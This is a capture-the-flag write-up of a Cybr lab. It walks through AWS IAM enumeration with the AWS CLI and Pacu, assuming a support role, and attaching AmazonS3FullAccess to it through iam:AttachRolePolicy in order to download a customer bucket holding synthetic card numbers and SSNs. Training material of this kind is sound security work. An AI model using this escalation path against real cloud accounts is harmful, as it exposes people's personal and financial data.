# Challenge Lab Name: `IAM AttachRolePolicy PrivEsc`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://cybr.com" target="_blank" title="Open Cybr Labs Platform"><img src="https://img.shields.io/badge/Cybr_Labs_↗-181717?style=flat&logo=pwnedlabs&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Cybr Labs Platform Link"></a> &nbsp;
>
>AWS IAM roles are incredibly useful and powerful, and you can assume them to receive permissions either within your account, or even for cross-account access
>
>You can do that using AssumeRole which returns a set of temporary security credentials that can then be used in a similar way to regular access keys, except they are short-term credentials instead of long-term credentials.
>
>If your IAM user has AssumeRole permissions for a particular role (which is dictated by a role's trust policy), you can assume that role and whatever permissions it has. If you have that permission plus the iam:AttachRolePolicy permission, then you can update the permissions for that role.
>
>Your lab user is one that has access to perform support functions by assuming roles with AssumeRole, including a role that has access to a non-sensitive S3 bucket containing generic files for an application that you support.
>
>However, this lab has been misconfigured to grant you iam:AttachRolePolicy. Leverage this misconfiguration to give that role additional S3 permissions that allow you to access a bucket containing PII that you were not intended to have access to.
>
>You've captured the flag when you've successfully downloaded the files contained in that bucket, and submitted the credit card number for 'Richard Gibson.'

</details>


<details open>
<summary><b>Initial Access & Enumeration</b></summary>

For the initial access I was given AWS credentials which I configured into an AWS profile named **attach** using the command `aws configure --profile attach`. Then running the command shown below I was able to see that these AWS credentials were for the IAM user **Support-Mike**. 

```bash
└─$ aws sts get-caller-identity --profile attach 
{
    "UserId": "AIDAZAEGC2A3PB4K3EODQ",
    "Account": "618756493366",
    "Arn": "arn:aws:iam::618756493366:user/Support-Mike"
}
```

With the user known I went ahead and checked if there were any inline policies attached using the command `aws iam list-user-policies --user-name Support-Mike --profile attach` but none were listed. I then tried to list managed policies attached to the user but I got an `AccessDenied` error so I just went ahead and opened up [Pacu](https://github.com/RhinoSecurityLabs/pacu), an AWS exploitation framework.

Before running any Pacu modules, I imported the AWS credentials using the AWS profile created earlier by running `import_keys attach`. Then the first module I ran was **iam__bruteforce_permissions** with the region flag option set to **us-east-1**. This module would check what possible API calls I could make as the IAM user **Support-Mike**.

```bash
Pacu (attach:imported-attach) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
2026-11-17 13:48:33,437 - 10849 - [INFO] Starting permission enumeration for access-key-id "AKIAZAEGC2A3CFCCMUVL"
...
...
Pacu (attach:imported-attach) > whoami
{
  "UserName": null,
  "RoleName": null,
  "Arn": null,
  "AccountId": null,
  "UserId": null,
  "Roles": null,
  "Groups": null,
  "Policies": null,
  "AccessKeyId": "AKIAZAEGC2A3CFCCMUVL",
  "SecretAccessKey": "YMRaSxmjFKiUAHoWHwJ5********************",
  "SessionToken": null,
  "KeyAlias": "imported-attach",
  "PermissionsConfirmed": null,
  "Permissions": {
    "Allow": [
      "iam:GetUser",
      "iam:ListUserPolicies",
      "iam:ListGroupsForUser",
      "iam:ListGroupPolicies",
      "iam:ListUsers",
      "iam:ListRoles",
      "iam:ListGroups",
      "iam:ListPolicies",
      "iam:GetUser",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "dynamodb:DescribeEndpoints"
    ],
    "Deny": []
  }
}
```

After the first module completed I ran `whoami` to check what permissions I had. From the output I saw that the initial access credentials had permission to enumerate for other users, roles, groups, and policies. With that said, I went ahead and ran the **iam__enum_users_roles_policies_groups**. 

Once the module completed I ran the **iam__enum_permissions** module to enumerate the permissions of users and roles in the AWS account. And after that module finished I went ahead and ran `whoami` again to see if there were any more permissions found for **Support-Mike**. 

```bash
Pacu (attach:imported-attach) > run iam__enum_users_roles_policies_groups 
  Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] Found 1 users
[iam__enum_users_roles_policies_groups] Found 21 roles
[iam__enum_users_roles_policies_groups] Found 2 policies
[iam__enum_users_roles_policies_groups] Found 1 groups
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  1 Users Enumerated
  21 Roles Enumerated
  2 Policies Enumerated
  1 Groups Enumerated
  IAM resources saved in Pacu database.
  ...
  Pacu (attach:imported-attach) > run iam__enum_permissions 
  Running module iam__enum_permissions...
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   Support-Mike...
[iam__enum_permissions]     List attached group policies failed
[iam__enum_permissions]       FAILURE: MISSING REQUIRED AWS PERMISSIONS
[iam__enum_permissions]     List attached user policies failed
[iam__enum_permissions]       FAILURE: MISSING REQUIRED AWS PERMISSIONS
[iam__enum_permissions]     Confirmed Permissions for Support-Mike
[iam__enum_permissions] iam__enum_permissions completed.

[iam__enum_permissions] MODULE SUMMARY:

   0 Confirmed permissions for 0 user(s).
   0 Confirmed permissions for 0 role(s).
  18 Unconfirmed permissions for user: Support-Mike.
   0 Unconfirmed permissions for 0 role(s).
Type 'whoami' to see detailed list of permissions.
```


<details>
<summary><b>Output of `whoami`</b></summary>

```bash
Pacu (attach:imported-attach) > whoami
{
  "UserName": "Support-Mike",
  "RoleName": null,
  "Arn": "arn:aws:iam::618756493366:user/Support-Mike",
  "AccountId": "618756493366",
  "UserId": "AIDAZAEGC2A3PB4K3EODQ",
  "Roles": null,
  "Groups": [
    {
      "Path": "/",
      "GroupName": "Support",
      "GroupId": "AGPAZAEGC2A3FIH4TWBD5",
      "Arn": "arn:aws:iam::618756493366:group/Support",
      "CreateDate": "Tue, 17 Nov 2026 21:44:16",
      "Policies": [
        {
          "PolicyName": "Support-policy"
        }
      ]
    }
  ],
  "Policies": [],
  "AccessKeyId": "AKIAZAEGC2A3CFCCMUVL",
  "SecretAccessKey": "YMRaSxmjFKiUAHoWHwJ5********************",
  "SessionToken": null,
  "KeyAlias": "imported-attach",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": {
      "iam:attachrolepolicy": {
        "Resources": [
          "arn:aws:iam::618756493366:role/SupportRole"
        ],
        "Conditions": [
          {
            "ArnEquals": {
              "aws:PrincipalARN": "arn:aws:iam::618756493366:user/Support-Mike"
            },
            "ForAllValues:ArnEquals": {
              "iam:PolicyArn": "arn:aws:iam::aws:policy/AmazonS3FullAccess"
            }
          }
        ]
      },
      "sts:assumerole": {
        "Resources": [
          "arn:aws:iam::618756493366:role/SupportRole"
        ]
      },
      "iam:listroles": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listusers": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgroups": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgroupsforuser": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrole": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrolepolicy": {
        "Resources": [
          "*",
          "arn:aws:iam::618756493366:role/SupportRole"
        ]
      },
      "iam:getuserpolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicyversions": {
        "Resources": [
          "*"
        ]
      },
      "iam:listgrouppolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getuser": {
        "Resources": [
          "*"
        ]
      },
      "iam:getgrouppolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicyversion": {
        "Resources": [
          "*"
        ]
      },
      "iam:listuserpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:listrolepolicies": {
        "Resources": [
          "arn:aws:iam::618756493366:role/SupportRole"
        ]
      }
    },
    "Deny": {}
  }
}
```

</details>

The list of permissions when running the `whoami` command is long so here is what I think were the highlights:
- IAM user **Support-Mike** had permission to assume the IAM role **SupportRole** 
- **Support-Mike** had permission to attach a policy **AmazonS3FullAccess** to the IAM role **SupportRole**

Some of these permissions weren't shown until I ran the other modules, and that's because Pacu needed to enumerate other IAM resources in the AWS account to enumerate their permissions. 

The additional permissions could be found on the AWS CLI by first checking what groups are attached to the IAM user **Support-Mike** by using this workflow:
1. Run the command `aws iam list-groups-for-user --user-name Support-Mike --profile attach` to check which groups are associated with the initial access user **Support-Mike**
2. Run `aws iam list-group-policies --group-name Support --profile attach` to list the policies were attached to group **Support** which I found there was one called **Support-policy**
3. Lastly, run the command `aws iam get-group-policy --group-name Support --policy-name Support-policy --profile attach` to view the statements inside the policy document


Since I had permission to assume the role **SupportRole** I checked what policies were attached to it by running the command below.

```bash
└─$ aws iam list-role-policies --role-name SupportRole --profile attach 
{
    "PolicyNames": [
        "AccessNOTSensitiveBucket"
    ]
}
```

From the output I could see that there was a policy named **AccessNOTSensitiveBucket** that was attached to the role, so to view the statements inside I ran the command below. This would show me the permissions I had once I assumed the role **SupportRole**. 

```bash
└─$ aws iam get-role-policy --policy-name AccessNOTSensitiveBucket --role-name SupportRole --profile attach 
{
    "RoleName": "SupportRole",
    "PolicyName": "AccessNOTSensitiveBucket",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:s3:::cybr-operations-data-618756493366",
                "Sid": "AllowListSensitiveBucket"
            },
            {
                "Action": [
                    "s3:GetObject"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:s3:::cybr-operations-data-618756493366/*",
                "Sid": "AllowGetObjectsInSensitiveBucket"
            },
            {
                "Action": [
                    "s3:ListAllMyBuckets",
                    "s3:GetBucketLocation"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "AllowS3List"
            }
        ]
    }
}
```

From the policy shown I could see that the IAM role was allowed to list S3 buckets that were being hosted in the AWS account. It also seemed like I had permission to get objects from the **cybr-operations-data-618756493366** bucket. 

With all this information, I went ahead and ran the command to assume the IAM role **SupportRole**. 

</details>

<details open>
<summary><b>Assuming IAM Role & S3 Enumeration</b></summary>

To assume the role of **SupportRole** I specifically ran the command below which output temporary credentials.

```bash
└─$ aws sts assume-role --role-arn arn:aws:iam::618756493366:role/SupportRole --role-session-name Support --profile attach
{
    "Credentials": {
        "AccessKeyId": "ASIA********EA",
        "SecretAccessKey": "e**************qxs",
        "SessionToken": "IQo**********tpOzio",
        "Expiration": "2026-11-17T23:04:44+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAZAEGC2A3GHEL4TYM2:Support",
        "Arn": "arn:aws:sts::618756493366:assumed-role/SupportRole/Support"
    },
    "PackedPolicySize": 17,
    "SessionTokenUtilization": 17,
    "SessionTokenSize": 736
}
```

I used the temporary credentials and created a new AWS profile by running `aws configure --profile priv`. Knowing that I had permission to list buckets that were being hosted on the AWS account I ran the command below. 

```bash
└─$ aws s3 ls --profile priv                  
2026-11-17 13:44:17 cybr-customer-data-618756493366
2026-11-17 13:44:17 cybr-operations-data-618756493366
```

From here I could see that there were 2 buckets listed. The **cybr-operations-data-618756493366** bucket was the one explicitly listed in the policy attached to this role, and that I could view. When I tried viewing the **cybr-customer-data-618756493366** bucket I got an `AccessDenied` error letting me know that I didn't have the right permissions. 

Moving on, I listed the objects that were in the S3 bucket **cybr-operations-data-618756493366** and saw that it was hosting a simple website. I had also downloaded the `index.html` using the command `aws s3 cp s3://cybr-operations-data-618756493366/index.html . --profile priv` to see if there might be any sensitive information, but there was nothing useful. 

```bash
└─$ aws s3 ls cybr-operations-data-618756493366 --profile priv
2026-11-17 13:44:18         70 favicon.png
2026-11-17 13:44:18        301 index.html
2026-11-17 13:44:18        142 style.css
```

</details>


<details open>
<summary><b>Privilege Escalation & Data Extraction</b></summary>

As mentioned earlier, the group policy associated with the initial access credentials would allow me to attach the specific role policy **AmazonS3FullAccess** to the role **SupportRole**. I did this by running the command below, which does not give an output. 

```bash
└─$ aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --role-name SupportRole --profile attach
```

Knowing that the policy attached was an AWS managed policy, [AmazonS3FullAccess](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AmazonS3FullAccess.html), I would not be able to list the new policy with the permissions of the intial access credentials or the IAM role assumed. 

What I ended up doing was checking to see if I could view the S3 bucket **cybr-customer-data-618756493366** with this policy attached to the IAM role now. 

```bash
└─$ aws s3 ls cybr-customer-data-618756493366 --profile priv                  
2026-11-17 13:44:18       1270 customers.txt
2026-11-17 13:44:18        465 ssn.csv
```

From the output I was able to see a `customers.txt` and `ssn.ssv` which I downloaded using the commands shown below. 

```bash
└─$ aws s3 cp s3://cybr-customer-data-618756493366/customers.txt . --profile priv
download: s3://cybr-customer-data-618756493366/customers.txt to ./customers.txt
...
...
└─$ aws s3 cp s3://cybr-customer-data-618756493366/ssn.csv . --profile priv
download: s3://cybr-customer-data-618756493366/ssn.csv to ./ssn.csv
```

The `customers.txt` file showed customer names, their email, and their credit card number!

```bash
└─$ cat customers.txt                     
Name: Shannon Johnson
Email: smitchell@example.com
Credit Card Number: 4569292420056
----------------------------------------
Name: Tim Simpson
Email: smithstacy@example.com
Credit Card Number: 4029969996362823
----------------------------------------
Name: Samantha Harris
Email: scott50@example.net
Credit Card Number: 377504576250936
----------------------------------------
Name: Susan Morgan
Email: pkey@example.net
Credit Card Number: 3546144391536498
...
```

The flag for this challenge is Richard Gibson's credit card number which is further down the list in the `customers.txt` file.

The `ssn.csv` file showed the customer's full name and their social security number! 

<div align="center">
  <img src="../images/IAM-AttachRolePolicy-PrivEsc/Pasted image 20261117141950.png" alt="Viewing the `ssn.csv` file." width="350" />
  <p><em>Viewing the `ssn.csv` file.</em></p>
</div>

</details>


<details open>
<summary><b>Impact & Reflection</b></summary>

This lab illustrated the impact a few configurations for an IAM user could have, when there purpose is to provide support services. I was able to attach an AWS managed policy to a role I could assume as the initial access user. This allowed me to view an S3 bucket with customer information including credit card numbers and social security numbers. 

In this lab, an [article](https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/) is mentioned which highlights how the same technique learned here was also used for a large-scale cloud extortion operation. Reading through it I could see that it is common to see in real-world environments sensitive data being exposed. Attackers used automated scanning to find these security weaknesses and further exploit services and infrastructure. Sometimes these misconfigurations can be because of bad processes in place such as lack of documentation or lack of security in general. This was a helpful piece included with the lab, and I recommend giving it a read. 

</details>
